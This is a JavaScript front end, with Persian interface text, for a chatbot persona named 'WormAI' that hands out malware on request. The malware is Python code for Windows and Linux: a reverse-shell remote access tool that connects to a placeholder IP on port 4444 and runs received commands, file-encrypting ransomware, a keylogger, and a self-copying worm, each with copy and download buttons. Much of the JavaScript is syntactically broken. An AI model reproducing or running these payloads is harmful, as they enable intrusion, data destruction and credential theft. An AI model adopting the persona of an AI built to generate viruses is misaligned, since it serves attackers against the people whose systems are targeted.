
// توابع کمکی
function escapeHtml(text) {
    return text
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}

function copyToClipboard() {
    const code = document.querySelector("#payloadOutput code");
    if (code) {
        navigator.clipboard.writeText(code.textContent)
            .then(() => alert("کد کپی شد!"))
            .catch(() => {
                const textarea = document.createElement("textarea");
                textarea.value = code.textContent;
                document.body.appendChild(textarea);
                textarea.select();
                document.execCommand("copy");
                document.body.removeChild(textarea);
                alert("کد کپی شد!");
            });
    }
}

function downloadCode(filename) {
    const code = document.querySelector("#payloadOutput code");
    if (code) {
        const blob = new Blob([code.textContent], { type: "text/plain" });
        const url = URL.createObjectURL(blob);
        const a = document.createElement("a");
        a.href = url;
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    }
}

// شیء اصلی WormAI
const WormAI = {
    payloads: {
        rat: {
            windows: import socket
import subprocess

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("YOUR_IP", 4444))
    while True:
        command = s.recv(1024).decode()
        if command == "exit":
            break
        output = subprocess.getoutput(command)
        s.send(output.encode())
    s.close()

if __name__ == "__main__":
    connect(),
            linux: #!/usr/bin/env python3
import socket
import subprocess

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("YOUR_IP", 4444))
    while True:
        command = s.recv(1024).decode()
        if command == "exit":
            break
        output = subprocess.getoutput(command)
        s.send(output.encode())
    s.close()

if __name__ == "__main__":
    connect()
        },
        ransomware: {
            windows: import os
from cryptography.fernet import Fernet

key = Fernet.generate_key()
with open("key.key", "wb") as key_file:
    key_file.write(key)

for file in os.listdir():
    if file.endswith(".txt"):
        with open(file, "rb") as f:
            data = f.read()
        encrypted = Fernet(key).encrypt(data)
        with open(file, "wb") as f:
            f.write(encrypted),
            linux: #!/usr/bin/env python3
import os
from cryptography.fernet import Fernet

key = Fernet.generate_key()
with open("key.key", "wb") as key_file:
    key_file.write(key)

for file in os.listdir():
    if file.endswith(".txt"):
        with open(file, "rb") as f:
            data = f.read()
        encrypted = Fernet(key).encrypt(data)
        with open(file, "wb") as f:
            f.write(encrypted)
        }
    },
    keylogger: {
        windows: import pynput.keyboard
import threading

log = ""

def on_press(key):
    global log
    try:
        log += str(key.char)
    except:
        log += " " + str(key) + " "

def report():
    global log
    print(log)
    log = ""
    timer = threading.Timer(10, report)
    timer.start()

keyboard_listener = pynput.keyboard.Listener(on_press=on_press)
with keyboard_listener:
    report()
    keyboard_listener.join(),
        linux: #!/usr/bin/env python3
import pynput.keyboard
import threading

log = ""

def on_press(key):
    global log
    try:
        log += str(key.char)
    except:
        log += " " + str(key) + " "

def report():
    global log
    print(log)
    log = ""
    timer = threading.Timer(10, report)
    timer.start()

keyboard_listener = pynput.keyboard.Listener(on_press=on_press)
with keyboard_listener:
    report()
    keyboard_listener.join()
    },
    worm: {
        windows: `import os
import shutil
for drive in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
    path = f"{drive}:\\\\"
    if os.path.exists(path):
        shutil.copy(__file__, os.path.join(path, "worm.exe")),
        linux: #!/usr/bin/env python3
import os
import shutil

for dir in ["/home", "/media"]:
    if os.path.exists(dir):
        shutil.copy(__file__, os.path.join(dir, "worm"))
    }
},

addMessage: function(text, isUser = false) {
    const chatBox = document.getElementById("chatBox");
    const messageDiv = document.createElement("div");
    messageDiv.className = message ${isUser ? "user" : "ai"};

    const avatar = document.createElement("div");
    avatar.className = "avatar";
    avatar.textContent = isUser ? "👤" : "🤖";

    const content = document.createElement("div");
    content.className = "content";
    content.innerHTML = <p>${text}</p>;

    messageDiv.appendChild(isUser ? content : avatar);
    messageDiv.appendChild(isUser ? avatar : content);
    chatBox.appendChild(messageDiv);
    chatBox.scrollTop = chatBox.scrollHeight;
},

generatePayload: function(type, os) {
    const output = document.getElementById("payloadOutput");
    output.innerHTML = "<p>در حال تولید ویروس...</p>";

    setTimeout(() => {
        if (this.payloads[type] && this.payloads[type][os]) {
            const code = this.payloads[type][os];
            output.innerHTML = 
                <div class="code-actions">
                    <button onclick="copyToClipboard()">کپی</button>
                    <button onclick="downloadCode('${type}_${os}.py')">دانلود</button>
                </div>
                <pre><code>${escapeHtml(code)}</code></pre>`;
        } else {
            output.innerHTML = "<p>خطا: کد موجود نیست.</p>";
        }
    }, 500);
},

respondToMessage: function(message) {
    const lowerMsg = message.toLowerCase();

    if (lowerMsg.includes("ویروس") || lowerMsg.includes("virus")) {
        if (lowerMsg.includes("rat") || lowerMsg.includes("راه دور")) {
            this.generatePayload("rat", "windows");
        } else if (lowerMsg.includes("باج") || lowerMsg.includes("ransomware")) {
            this.generatePayload("ransomware", "windows");
        } else if (lowerMsg.includes("کی لاگر") || lowerMsg.includes("keylogger")) {
            this.generatePayload("keylogger", "windows");
        } else if (lowerMsg.includes("کرم") || lowerMsg.includes("worm")) {
            this.generatePayload("worm", "windows");
        } else {
            this.addMessage("چه نوع ویروسی می‌خوای؟ RAT، باج‌افزار، کی‌لاگر یا کرم؟");
        }
    } else if (lowerMsg.includes("سلام")) {
        this.addMessage("سلام! من آماده تولید ویروس هستم.");
    } else {
        this.addMessage("نمی‌فهمم. می‌تونی دقیق‌تر بگی؟");
    }
}
};

// اتصال رویدادها
document.addEventListener("DOMContentLoaded", function() {
    const sendBtn = document.getElementById("sendBtn");
    const userInput = document.getElementById("userInput");
    const clearBtn = document.getElementById("clearBtn");
    const generateBtn = document.getElementById("generateBtn");

    sendBtn.addEventListener("click", function() {
        const message = userInput.value.trim();
        if (message) {
            WormAI.addMessage(message, true);
            userInput.value = "";
            setTimeout(() => WormAI.respondToMessage(message), 500);
        }
    });

    userInput.addEventListener("keypress", function(e) {
        if (e.key === "Enter") sendBtn.click();
    });

    clearBtn.addEventListener("click", function() {
        document.getElementById("chatBox").innerHTML = "";
        WormAI.addMessage("چت پاک شد. آماده تولید ویروس جدید هستم.", false);
    });

    generateBtn.addEventListener("click", function() {
        const type = document.getElementById("payloadType").value;
        const os = document.getElementById("osTarget").value;
        WormAI.generatePayload(type, os);
    });
});
